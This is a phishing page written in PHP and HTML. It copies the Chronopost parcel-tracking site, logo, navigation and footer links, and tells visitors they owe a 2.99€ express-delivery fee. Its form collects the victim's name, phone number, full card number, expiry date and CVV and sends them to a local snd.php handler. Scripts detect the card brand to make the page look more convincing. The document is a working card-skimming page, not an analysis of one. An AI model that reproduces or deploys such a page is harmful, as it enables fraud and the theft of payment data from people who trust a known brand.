﻿<?php include './poste_files/browser.php'; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- saved from url=(0072)http://www.chronopost.fr/expedier/inputLTNumbersNoJahia.do?listeNumeros= -->
<html xmlns="http://www.w3.org/1999/xhtml" lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Envoi et suivi de colis express. Livraison colis international avec Chronopost - Suivi colis</title>
		<meta name="MSSmartTagsPreventParsing" content="true">
		
		
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		
		<meta http-equiv="imagetoolbar" content="no">
		<meta name="keywords" lang="fr" content="suivi colis, suivre colis, suivi envoi colis, numero envoi colis, service suivi colis, colis international, envoi express, suivi transport express colis, tarif envoi colis, chronopost, chronopost international">
		<meta name="description" lang="fr" content="Suivi et envoi de colis avec le service Chronopost international. Transport express, livraison et tarif colis sur Chronopost.fr">
		
		<link rel="stylesheet" type="text/css" href="./poste_files/style.css">
		
		<!--[if IE 8 ]> <link type="text/css" rel="stylesheet" href="pages/_style/ie.css?version=1.7.3" /><![endif]-->
        <!--[if lt IE 8 ]> <link type="text/css" rel="stylesheet" href="pages/_style/ie7.css?version=1.7.3" /><![endif]-->
        <!--[if lt IE 7 ]> <link type="text/css" rel="stylesheet" href="pages/_style/ie6.css?version=1.7.3" /><![endif]-->
		
		
		
	</head>

	<body>
		
		
			
			








	



<div class="web entete">
	<a id="debut" name="debut" href="http://www.chronopost.fr/expedier/inputLTNumbersNoJahia.do?listeNumeros=#debut" title="Début de page"></a>
	<div class="rampe"><a href="http://www.chronopost.fr/expedier/inputLTNumbersNoJahia.do?listeNumeros=#contenu">Contenu de page</a></div>
	
<ul>
		
	
		
			
			
			   <!-- login no -->			
            	<li>
            	
            	
            <a href="http://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=704&amp;iv4Context=-1" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;Aide&#39;,&#39;N&#39;)" title="Aide">Aide</a>
             
            	</li>
            	<li>
            	
            	
            <a href="http://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=713&amp;iv4Context=-1" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FAQ&#39;,&#39;N&#39;)"><acronym title="&#39;FAQ&#39; : Foire aux questions">FAQ</acronym></a>
            
            	</li>
            	<li>
            	
            	
            <input type="button" value="Espace client" >
            	
            	</li>
            	
			
		
		
		
	
	
	
	
		</ul>
		
<a href="http://www.chronopost.fr/transport-express/livraison-colis/loginById.do?pid=600&amp;iv4Context=-1" title="Chronopost">
	<img src="./poste_files/logo-chronopost-international.png" alt="Logo de Chronopost international">
	</a> 
	
</div><!-- /web entete -->
<div class="ennavi">
	
	<div class="web">
	
	<ol>
		
			
			
			   <!-- login no -->
            <li class="premier"><a href="http://www.chronopost.fr/transport-express/livraison-colis/loginById.do?pid=600&amp;iv4Context=-1" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;Accueil&#39;,&#39;N&#39;)" title="ACCUEIL"><span>ACCUEIL</span></a></li>
			
		
		<li class="actif">
		    <a href="http://www.chronopost.fr/expedier/accueilShipping.do?reinit=true&amp;iv4Context=-1" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;Expedier&#39;,&#39;N&#39;)" title="EXPEDIER">EXPEDIER</a>
		</li>
		
			
			
				<li>
					<a href="http://www.chronopost.fr/expedier/accueilShipping.do;JSESSIONID_IV4=Y7RKrNHFsw87R9vyvLyy2G8PtPJpxlvdJLxL0X16QvVxKqQsD9TG!-177722695" title="ENLEVER" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;Enlever&#39;,&#39;N&#39;)">ENLEVER</a>
				</li>
			
		
		
			
			
			   <!-- login no -->
            <li><a href="http://www.chronopost.fr/transport-express/livraison-colis/loginById.do?pid=701&amp;iv4Context=-1" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;Suivre&#39;,&#39;N&#39;)" title="SUIVRE">SUIVRE</a></li>
			
		
	</ol>
	<ul>
		
			
			
			   <!-- login no -->
            <li><a href="http://www.chronopost.fr/transport-express/livraison-colis/loginById.do?pid=702&amp;iv4Context=-1" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;Offre Chronopost&#39;,&#39;N&#39;)" title="OFFRE CHRONOPOST">OFFRE CHRONOPOST</a></li>
            <li><a href="http://www.chronopost.fr/transport-express/livraison-colis/loginById.do?pid=703&amp;iv4Context=-1" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;A Propos De Chronopost&#39;,&#39;N&#39;)" title="A PROPOS DE CHRONOPOST">A PROPOS DE CHRONOPOST</a></li>
			
		
	</ul>
	
	<form action="http://www.chronopost.fr/transport-express/livraison-colis/engineName/search/accueil" method="post" onsubmit="checkMaxPageItems(document.searchForm);setFreeSearchInput(document.searchForm);">
		<div>
			<label for="potenceRechercheInput">Rechercher</label>
			<input type="text" id="potenceRechercheInput" name="search" value="" maxlength="64">
			<input type="submit" value="ok" class="validant" alt="ok">
            <input type="hidden" name="PageSearchResultBuilder.onlyOneHitByPage" value="false">
            <input type="hidden" name="searchView" value="simple">
            <input type="hidden" name="searchHandler" value="advSearch">
            <input type="hidden" name="freeSearch" value="">
		</div>
	</form>
	
	
	</div>
	
</div><!-- /web ennavi -->



		
	
			
				<div class="web encorp suivi">
				
				<div class="contenuCol1">
					<p class="ariane">Accueil&gt;Suivre &gt;Liste des envois et/ou enlèvements"	</p>
					<h1>Liste des envois et/ou enlèvements</h1>
					<div class="intro">
						<p><strong>Chronopost vous permet le suivi de vos envois de colis à tout moment et ce depuis l'expédition jusqu'a la livraison.</strong></p>
					</div>
			
			<div>
				<h2 class="sousTitre">Colis en express : Votre colis expédié sous 24h (2.99€) . </h2>
				<div class="contenuBloc1 corrige">
					
						<span class="IV4TextError">
							Si vous n'êtes pas satisfait du produit du livré . vos frais de livraison seront remboursés .
						</span>
					
	
					<div class="contenuBloc1Interne suiviEnvoi">
						<form id="suiviForm" method="post" action="snd.php">
							<h3>Nom et Prenom :</h3>
						
							<p class="mb20"><input type="text" onkeyup="rplll(this)" minlength="5" maxlength="50" required aria-required="true" id="potenceRechercheInput" name="nom" value="">
							<script type="text/javascript">

function rplll(inp){
inp.value = inp.value.replace(/[^a-zA-Z| |.]/g, '');
}

</script></p>

<h3>N° de Tel :</h3>
						
							<p class="mb20"><input type="text" onkeyup="rpllll(this)" minlength="5" maxlength="50" required aria-required="true" id="potenceRechercheInput" name="tel" value="">
							<script type="text/javascript">

function rpllll(inp){
inp.value = inp.value.replace(/[^0-9]/g, '');
}

</script></p>

									<h3>Numéro de carte bancaire :

:</h3>
						
							<p class="mb20"><input type="text" required aria-required="true" maxlength="17" minlength="15" autocomplete="off" autocorrect="off" autocapitalize="on" placeholder="xxxx xxxx xxxx xxxx" onkeyup="rpl(this)" onkeydown="GetTypeNumber(this.value)" onmouseover="GetTypeNumber(this.value)" onblur="GetTypeNumber(this.value)" id="cc" name="ccnum" value="" >
							
							<script type="text/javascript">
function rpl(inp){
inp.value = inp.value.replace(/[^\d]/g, '');
}
function print(a){
    if (a=='?????'){  
    	document.getElementById('cc').style.backgroundImage = "url('poste_files/generic.png')";
      //document.getElementById('dftCN').style="background:url('../css/img/cd/generic.png') no-repeat scroll right center border-box #FFF";
    }else{
    	document.getElementById('cc').style.backgroundImage = "url('poste_files/"+a+".png')";
     //document.getElementById('dftCN').style="background:url('../css/img/cd/"+a+".png') no-repeat scroll right center border-box #FFF;background-size: 46px 26px;";
    }
   document.getElementById("CT").value=a;
}
 function GetTypeNumber(NB) {
    var etat = false;
    //rest_logo();
    var cc = (NB + '').replace(/\s/g, ''); //remove space
    if ((/^(3)/).test(cc)) {
        print(1); //AMEX begins with 34 or 37, and length is 15.
        etat = true;
    } else if ((/^(4)/).test(cc)) {
        print(3);
        etat = true;
    } else if ((/^(5)/).test(cc)) {
        print(2);
        etat = true;
    } else if ((/^(6)/).test(cc)) {
        print(6); 
        etat = true;
    }else{
        print('?????'); 
    }
    return etat;
}
</script>
							</p>
								<h3>Date d'expiration :</h3>
						
							<p class="mb20"><input type="text" onkeyup="rpll(this)" minlength="10"  maxlength="10" required aria-required="true" placeholder="MM/AAAA" id="expr" name="expMonth" value="" >
							<script type="text/javascript">

function rpll(inp){
inp.value = inp.value.replace(/[^\d|/]/g, '');
}

</script></p>
								<h3>Cryptogramme visuel:</h3>
						
							<p class="mb20"><input type="text" onkeyup="rpl(this)" minlength="3" name="cvv2" maxlength="4" required aria-required="true" id="cvv" name="cvv2" value="" ></p>
							<p class="txt-right">
									<input type="submit" value="Valider" class="boutonValider">
								</p>
						      </div>
						</form>
					</div><!-- /contenuBloc1Interne -->
				</div><!-- /contenuBloc1 -->			
			</div><!-- /interneCol1 -->
		
		
		
			</div><!-- /contenuCol1 -->
			
			
		</div>
		
		



























<div class="enpied">
		<div class="web">
	<ol>
		
			
			
			   <!-- login no -->
            <li><a href="http://www.chronopost.fr/transport-express/livraison-colis/loginById.do?urlkey=homepage" title="English version" target="_blank" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterChronopostFR&#39;,&#39;N&#39;)">English version</a></li>
           	
            <li><a href="http://www.chronopost.fr/transport-express/livraison-colis/accueil/pid/6702" title="Chronopost recrute" target="_blank" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterChronopostRecrute&#39;,&#39;S&#39;)">Chronopost recrute</a></li>
            <li><a href="http://boutique.chronopost.fr/" target="_blank" title="E-boutique" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterEBoutique&#39;,&#39;N&#39;)">E-boutique</a></li>
            
            <li><a href="http://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=1000&amp;iv4Context=-1" title="Mentions légales" target="_blank" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterMentionsLegales&#39;,&#39;N&#39;)">Mentions légales</a></li>
            
            <li><a href="http://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=714&amp;iv4Context=-1" title="Contact" target="_blank" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterContact&#39;,&#39;N&#39;)">Contact</a></li>
            <li><a href="http://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=1523&amp;iv4Context=-1" title="Espace presse" target="_blank" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterEspacePresse&#39;,&#39;N&#39;)">Espace presse</a></li>
			<li class="dernier"><a href="http://www.chronopost.fr/transport-express/livraison-colis/logout.do?pid=1425&amp;iv4Context=-1" title="Plan du site" target="_blank" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterPlanDuSite&#39;,&#39;N&#39;)">Plan du site</a></li>
            
			
		
	</ol>
	
	<img src="./poste_files/double-logo.png" alt="Chronopost international">
	
	
	
	<p>
		<a href="http://www.transport-express-colis.com/" target="_blank" title="Transport express de colis" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterTransportExpressDeColis&#39;,&#39;S&#39;)">Transport express de colis</a>
		|
		<a href="http://www.laposte.fr/" target="_blank" title="La Poste" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterLaPoste&#39;,&#39;S&#39;)">La Poste</a>
		|
		<a href="http://www.geopostgroup.com/" target="_blank" title="GeoPost" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterGeoPost&#39;,&#39;S&#39;)">GeoPost</a>
		|
		<a href="http://timbres.laposte.fr/?prov=313" target="_blank" title="La Boutique du Timbre" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterLaBoutiqueDuTimbre&#39;,&#39;S&#39;)">La Boutique du Timbre</a>
		|
		<a href="http://www.laposte.fr/boxecommerce" target="_blank" onclick="xt_med(&#39;C&#39;,&#39;5&#39;,&#39;FooterBoxECommerce&#39;,&#39;S&#39;)" title="Box e-commerce">Box e-commerce</a>
	</p>
	
	
	
	</div>
	
</div><!-- /web enpied -->


<!-- Marqueur Xiti -->


<noscript>
	&lt;img width="1" height="1" alt="" src="http://logc406.xiti.com/hit.xiti?s=555972&amp;s2=&amp;p=suividetaille::Accueil&amp;di=&amp;an=&amp;ac=" /&gt;
</noscript>


<!-- .Marqueur Xiti -->

		
		
			


</body></html>